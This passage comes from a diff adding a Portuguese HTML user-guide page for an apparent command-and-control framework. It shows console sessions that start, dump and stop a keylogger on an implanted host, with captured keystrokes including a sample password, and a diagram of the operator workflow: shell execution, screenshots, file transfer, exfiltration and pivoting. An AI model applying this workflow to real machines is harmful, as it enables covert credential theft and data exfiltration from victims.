+<a href="#__codelineno-15-4" id="__codelineno-15-4" name="__codelineno-15-4"></a>SOCKS5 proxy listening on :1080
+</code></pre></div>
+<h3 id="keylogger">Keylogger<a class="headerlink" href="#keylogger" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a href="#__codelineno-16-1" id="__codelineno-16-1" name="__codelineno-16-1"></a>wolfgang [a1b2c3d4] &gt;&gt; keylog start
+<a href="#__codelineno-16-2" id="__codelineno-16-2" name="__codelineno-16-2"></a>[*] Task queued: d6e7f8a9 (module=recon.keylogger)
+<a href="#__codelineno-16-3" id="__codelineno-16-3" name="__codelineno-16-3"></a>[+] Task completed:
+<a href="#__codelineno-16-4" id="__codelineno-16-4" name="__codelineno-16-4"></a>Keylogger started.
+<a href="#__codelineno-16-5" id="__codelineno-16-5" name="__codelineno-16-5"></a>
+<a href="#__codelineno-16-6" id="__codelineno-16-6" name="__codelineno-16-6"></a>wolfgang [a1b2c3d4] &gt;&gt; keylog dump
+<a href="#__codelineno-16-7" id="__codelineno-16-7" name="__codelineno-16-7"></a>[*] Task queued: e7f8a9b0 (module=recon.keylogger)
+<a href="#__codelineno-16-8" id="__codelineno-16-8" name="__codelineno-16-8"></a>[+] Task completed:
+<a href="#__codelineno-16-9" id="__codelineno-16-9" name="__codelineno-16-9"></a>[10:25:01] admin: password123
+<a href="#__codelineno-16-10" id="__codelineno-16-10" name="__codelineno-16-10"></a>[10:25:15] admin: ls -la /root
+<a href="#__codelineno-16-11" id="__codelineno-16-11" name="__codelineno-16-11"></a>
+<a href="#__codelineno-16-12" id="__codelineno-16-12" name="__codelineno-16-12"></a>wolfgang [a1b2c3d4] &gt;&gt; keylog stop
+<a href="#__codelineno-16-13" id="__codelineno-16-13" name="__codelineno-16-13"></a>[*] Task queued: f8a9b0c1 (module=recon.keylogger)
+<a href="#__codelineno-16-14" id="__codelineno-16-14" name="__codelineno-16-14"></a>[+] Task completed:
+<a href="#__codelineno-16-15" id="__codelineno-16-15" name="__codelineno-16-15"></a>Keylogger stopped.
+</code></pre></div>
+<h2 id="resumo-do-fluxo">Resumo do Fluxo<a class="headerlink" href="#resumo-do-fluxo" title="Permanent link">¶</a></h2>
+<pre class="mermaid"><code>graph TD
+    USE["use &lt;agent_id&gt;"] --&gt; CTX["Contexto do Agent"]
+    CTX --&gt; EXEC["exec / shell / run"]
+    CTX --&gt; RECON["sysinfo / screenshot / keylog"]
+    CTX --&gt; FILES["upload / download"]
+    CTX --&gt; EXFIL["exfil / exfils"]
+    CTX --&gt; ADV["portfwd / socks / pivot"]
+
+    EXEC --&gt; TASK["Task criada (pending)"]
+    RECON --&gt; TASK
+    FILES --&gt; TASK
+    EXFIL --&gt; TASK
+    ADV --&gt; TASK
+
+    TASK --&gt; CHECKIN["Agent faz check-in"]
+    CHECKIN --&gt; RUN["Modulo executa"]
+    RUN --&gt; RESULT["Resultado retorna"]
+    RESULT --&gt; VIEW["Operador ve resultado"]
+
+    style USE fill:#0f3460,stroke:#e94560,color:#fff
+    style CTX fill:#0f3460,stroke:#e94560,color:#fff
+    style TASK fill:#533483,stroke:#e94560,color:#fff
+    style VIEW fill:#0f3460,stroke:#16213e,color:#fff
+</code></pre>
+<h2 id="veja-tambem">Veja tambem<a class="headerlink" href="#veja-tambem" title="Permanent link">¶</a></h2>
+<ul>
+<li><a href="../next-steps/">Proximos Passos</a> -- topicos avancados e guias de referencia</li>
+<li><a href="../first-implant/">Primeiro Implant</a> -- etapa anterior</li>
+<li><a href="../../developer-guide/adding-modules/">Developer Guide: Criando Modulos</a> -- como criar seus proprios modulos</li>
+</ul>
+</article>
+</div>
+<script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+</div>
+<button class="md-top md-icon" data-md-component="top" hidden="" type="button">
+<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
+  Voltar para o topo
+</button>
+</main>
+<footer class="md-footer">
+<div class="md-footer-meta md-typeset">
+<div class="md-footer-meta__inner md-grid">
+<div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
+      Material for MkDocs
+    </a>
+</div>
+</div>
+</div>
+</footer>
+</div>
+<div class="md-dialog" data-md-component="dialog">
+<div class="md-dialog__inner md-typeset"></div>
+</div>
+<script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy", "content.tabs.link", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "navigation.tracking", "navigation.indexes", "toc.integrate", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado para \u00e1rea de transfer\u00eancia", "clipboard.copy": "Copiar para \u00e1rea de transfer\u00eancia", "search.result.more.one": "mais 1 nesta p\u00e1gina", "search.result.more.other": "# mais nesta p\u00e1gina", "search.result.none": "Nenhum documento encontrado", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Digite para iniciar a busca", "search.result.term.missing": "Ausente", "select.version": "Selecione a vers\u00e3o"}, "version": null}</script>
+<script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+<script type="module">import mermaid from "https://unpkg.com/mermaid@10.4.0/dist/mermaid.esm.min.mjs";
+window.mermaidConfig = {default: {
+    startOnLoad: false
+}};</script></body>
+</html>
